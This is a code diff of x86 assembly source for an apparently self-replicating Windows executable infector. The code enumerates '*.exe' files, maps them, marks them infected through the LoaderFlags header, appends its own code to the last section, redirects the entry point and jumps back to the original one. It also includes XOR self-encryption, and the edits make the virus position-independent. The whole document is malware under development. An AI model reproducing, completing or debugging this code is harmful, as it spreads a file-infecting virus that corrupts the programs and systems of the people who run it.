@@ -44,15 +44,18 @@ APPLYXORVALUE	macro addrbegin, addrend, value
 				endm
 
 GETLABELOFFSET	macro labelBegin, labelEnd, dest
+	push esi
 	mov esi, labelEnd
 	sub esi, labelBegin
 	mov dest, esi
+	pop esi
 				endm
 
 
 main:
 	mov ebx, [esp]
 	jmp crypted_code_end
+	signature db 44 DUP(44h)
 
 applyxorvalue	proc addrbegin:dword, addrend:dword, value:dword
 
@@ -363,7 +366,7 @@ postMappingOperations proc pointerToInfectionCode:dword
 	movloc cryptedCodeEnd, pointerToInfectionCode
 	addloc cryptedCodeEnd, offsetCryptedCode
 
-	APPLYXORVALUE cryptedCodeBegin, cryptedCodeEnd, iXorValue
+	;;APPLYXORVALUE cryptedCodeBegin, cryptedCodeEnd, iXorValue
 	;; now, we XOR the part of the file which holds our code, using the new xor key
 
 	
@@ -372,23 +375,6 @@ postMappingOperations proc pointerToInfectionCode:dword
 	ret
 postMappingOperations endp
 
-testproc proc
-
-	push 0h
-blah:pop eax
-	
-	mov edx, 0h
-	mov edx, 0h
-	bleh:mov edx, 0h
-	;;mov eax, uncryptor_buffer
-
-
-
-	ret
-
-testproc endp
-
-
 filesLoop proc k32hmodule:HMODULE, prcGetProcAddr:dword, sectionSize:dword, codeSize:dword
 	local findFileData:WIN32_FIND_DATA
 	local searchHandle:dword
@@ -396,6 +382,7 @@ filesLoop proc k32hmodule:HMODULE, prcGetProcAddr:dword, sectionSize:dword, code
 	local fileMapping:dword
 	local fileView:dword
 	local originalEntryPoint:dword
+	local infectionEntryPoint:dword
 	local newSectionStart:dword
 	local virtualSectionStart:dword
 	local localdelta:dword
@@ -416,41 +403,50 @@ filesLoop proc k32hmodule:HMODULE, prcGetProcAddr:dword, sectionSize:dword, code
 	PatternStr				db "*.exe",0				; size = 06h, offset = 00h
 	strFindFirstFile		db "FindFirstFileA",0		; size = 0fh, offset = 06h
 	strFindNextFile			db "FindNextFileA",0		; size = 0eh, offset = 15h
-	strFindClose			db "FindClose",0			; size = 0ah,
-	strCreateFile			db "CreateFileA",0			; size = ,
-	strCreateFileMapping	db "CreateFileMappingA",0	; size = ,
-	strMapViewOfFile		db "MapViewOfFile",0		; size = ,
-	strUnmapViewOfFile		db "UnmapViewOfFile",0		; size = ,
-	strCloseHandle			db "CloseHandle",0			; size = ,
-	strGetSystemTime		db "GetSystemTime",0
+	strFindClose			db "FindClose",0			; size = 0ah, offset = 23h
+	strCreateFile			db "CreateFileA",0			; size = 0ch, offset = 2dh
+	strCreateFileMapping	db "CreateFileMappingA",0	; size = 13h, offset = 39h
+	strMapViewOfFile		db "MapViewOfFile",0		; size = 0eh, offset = 4ch
+	strUnmapViewOfFile		db "UnmapViewOfFile",0		; size = 10h, offset = 5ah
+	strCloseHandle			db "CloseHandle",0			; size = 0ch, offset = 6ah
+	strGetSystemTime		db "GetSystemTime",0		; size = 0eh, offset = 76h
 
 filesLoopInit:
 
-	mov esi, dword ptr [esp]
+	;;mov esi, dword ptr [esp]
+	pop esi ;; that way we can properly return from the proc before the nest eip is not stacked anymore
 	mov localdelta, esi
 	;movloc localdelta, [esp]
 
-	;;loadprocoff prcFindFirstFile, k32hmodule, prcGetProcAddr, localdelta, 06h
-	loadproc prcFindFirstFile,		k32hmodule, prcGetProcAddr, offset strFindFirstFile
-	loadproc prcFindNextFile,		k32hmodule, prcGetProcAddr, offset strFindNextFile
-	loadproc prcFindClose,			k32hmodule, prcGetProcAddr, offset strFindClose
-	loadproc prcCreateFile,			k32hmodule, prcGetProcAddr, offset strCreateFile
-	loadproc prcCreateFileMapping,	k32hmodule, prcGetProcAddr, offset strCreateFileMapping
-	loadproc prcMapViewOfFile,		k32hmodule, prcGetProcAddr, offset strMapViewOfFile
-	loadproc prcUnmapViewOfFile,	k32hmodule, prcGetProcAddr, offset strUnmapViewOfFile
-	loadproc prcCloseHandle,		k32hmodule, prcGetProcAddr, offset strCloseHandle
+	loadprocoff prcFindFirstFile,		k32hmodule, prcGetProcAddr, localdelta, 06h
+	loadprocoff prcFindNextFile,		k32hmodule, prcGetProcAddr, localdelta, 15h	
+	loadprocoff prcFindClose,			k32hmodule, prcGetProcAddr, localdelta, 23h
+	loadprocoff prcCreateFile,			k32hmodule, prcGetProcAddr, localdelta, 2dh
+	loadprocoff prcCreateFileMapping,	k32hmodule, prcGetProcAddr, localdelta, 39h
+	loadprocoff prcMapViewOfFile,		k32hmodule, prcGetProcAddr, localdelta, 4ch
+	loadprocoff prcUnmapViewOfFile,		k32hmodule, prcGetProcAddr, localdelta, 5ah
+	loadprocoff prcCloseHandle,			k32hmodule, prcGetProcAddr, localdelta, 6ah
+	
+	;;loadproc prcFindFirstFile,		k32hmodule, prcGetProcAddr, addr strFindFirstFile
+	;;loadproc prcFindNextFile,		k32hmodule, prcGetProcAddr, addr strFindNextFile
+	;;loadproc prcFindClose,			k32hmodule, prcGetProcAddr, addr strFindClose
+	;;loadproc prcCreateFile,			k32hmodule, prcGetProcAddr, addr strCreateFile
+	;;loadproc prcCreateFileMapping,	k32hmodule, prcGetProcAddr, addr strCreateFileMapping
+	;;loadproc prcMapViewOfFile,		k32hmodule, prcGetProcAddr, addr strMapViewOfFile
+	;;loadproc prcUnmapViewOfFile,	k32hmodule, prcGetProcAddr, addr strUnmapViewOfFile
+	;;loadproc prcCloseHandle,		k32hmodule, prcGetProcAddr, addr strCloseHandle
 	
 
-	mov esi, offset procGetSystemTime
-	loadproc ebx, k32hmodule, prcGetProcAddr, offset strGetSystemTime
-	mov dword ptr[esi], ebx
-
-	invoke decryptorGenerator
+	;;mov esi, offset procGetSystemTime
+	;;loadproc ebx, k32hmodule, prcGetProcAddr, offset strGetSystemTime
+	;;mov dword ptr[esi], ebx
+	;;invoke decryptorGenerator
 
 	;invoke FindFirstFile, offset PatternStr, addr findFileData
 	lea edi, findFileData
 	push edi
-	push offset PatternStr
+	;;push offset PatternStr
+	push localdelta ;; raddr PatternStr
 	call prcFindFirstFile
 
 	cmp eax, INVALID_HANDLE_VALUE
@@ -530,10 +526,10 @@ fileMainLoop:
 	assume ebx: ptr IMAGE_NT_HEADERS
 
 	; check for loadFlags field -> infected or not?
-	.if [ebx].OptionalHeader.LoaderFlags == 46554342
+	.if [ebx].OptionalHeader.LoaderFlags == 44444444h;46554342
 		jmp fileMapViewClose
 	.endif
-	mov [ebx].OptionalHeader.LoaderFlags, 46554342
+	mov [ebx].OptionalHeader.LoaderFlags, 44444444h;46554342
 
 
 	; look for the last section, the last is the one with the biggest VirtualAddress
@@ -556,7 +552,7 @@ fileMainLoop:
 
 ; --------------------------------------------------------------------------------------------------
 
-	; extend the general file size in the [ebx].FileHeader.SizeOfImage
+; extend the general file size in the [ebx].FileHeader.SizeOfImage
 ;	mov ecx, [ebx].OptionalHeader.SizeOfImage
 ;	add ecx, 2048 + SIZEOF DWORD ; FIXME : sizeof payload + SIZEOF DWORD
 ;	mov edx, [ebx].OptionalHeader.SectionAlignment
@@ -580,6 +576,7 @@ fileMainLoop:
 	dec edx ; don't go to far
 
 	; get to the right place
+	; TODO: a fix ?
 	mov ecx, edx
 	.while byte ptr [edx] == 0 || byte ptr [edx] == 90h
 		dec edx
@@ -593,15 +590,19 @@ fileMainLoop:
 	add eax, [edi].SizeOfRawData ; the vadress of the end of the section
 	sub eax, ecx
 	mov [ebx].OptionalHeader.AddressOfEntryPoint, eax ; writing
-
+	mov infectionEntryPoint, eax
 
 	push esi
 	push edi
 	push ecx
-
+	push edx
 	; copy the payload at the right place
 	
-	mov esi, main ;from the beginning of our code
+	call __getcur0
+__getcur0:
+	pop esi ;;current address is now in esi
+	GETLABELOFFSET main, __getcur0, edx
+	sub esi, edx ;; esi now holds the runtime addr of our code.
 
 	mov edi, newSectionStart
 
@@ -609,6 +610,7 @@ fileMainLoop:
 	mov ecx, codeSize ; copy sectionSize bytes
 	rep movsb ;HOLY SH1T 1TS T34L
 
+	pop edx
 	pop ecx
 	pop edi
 	pop esi
@@ -617,11 +619,16 @@ fileMainLoop:
 	add eax, codeSize ; go to the very end of what we copied.
 	sub eax, 6 ; go back 6 bytes, which is ret and 5 nops
 	; copy the real entry point adress
-	mov byte ptr [eax], 0E9h ; E9h JMP, E8h CALL ; bug du compilo
+	mov byte ptr [eax], 0EAh ; E9h JMP, E8h CALL ; bug du compilo
 	inc eax
+
+
+	;; TODO : originalEntryPoint pas bon
 	mov ecx, originalEntryPoint
 	mov dword ptr [eax], ecx
-	add [edi].Characteristics, IMAGE_SCN_MEM_EXECUTE
+	or [edi].Characteristics, IMAGE_SCN_MEM_EXECUTE
+	or [edi].Characteristics, IMAGE_SCN_MEM_WRITE
+	or [edi].Characteristics, IMAGE_SCN_MEM_READ
 	; increase header size
 	mov eax, sectionSize
 	add [edi].SizeOfRawData, eax
@@ -677,7 +684,7 @@ beginInfection proc delta:dword
 	local sectionSize:dword
 	local codeSize:dword
 
-	jmp Kernel32Init
+	call Kernel32Init
 
 beginInfectionStr:
 	LoadLibraryStr	db "LoadLibraryA",0		; localDelta + 0h
@@ -688,8 +695,11 @@ beginInfectionStr:
 	Kernel32Dllstr	db "Kernel32.dll",0		; + 07h
 
 Kernel32Init:
-	mov eax, [esp]
-	mov localDelta, beginInfectionStr
+	;;mov eax, [esp]
+	pop eax
+	mov localDelta, eax
+	;;mov localDelta, offset beginInfectionStr
+	
 	invoke extractKernel32PEHeader, delta
 	mov K32PEHeaderAddr, eax
 	invoke getPEBaseAddr, K32PEHeaderAddr
@@ -754,7 +764,8 @@ startinf:
 	xor eax, eax
 	;invoke extractKernel32PEHeader, ebx
 	;invoke testproc
-	invoke beginInfection, ebx
+	push ebx
+	call beginInfection
 	jmp final_return
 
 crypted_code_end:
@@ -772,14 +783,15 @@ start_uncrypt:
 
 	;invoke applyxorvalue, offset crypted_code_begin, offset crypted_code_end, CKV
 	jmp startinf
-	
+
 final_return:
 	; making room for the very last jmp instruction ...
-	nop ; JMP E9
-	nop ; there goes the 32 bit adress we jump to
-	nop	; sssh
-	nop	; no tears
-	nop	; only dreams now
+	nop
+	nop
+	nop
+	nop
+	nop
+endcode:
 	ret
 endfile:
 end	main
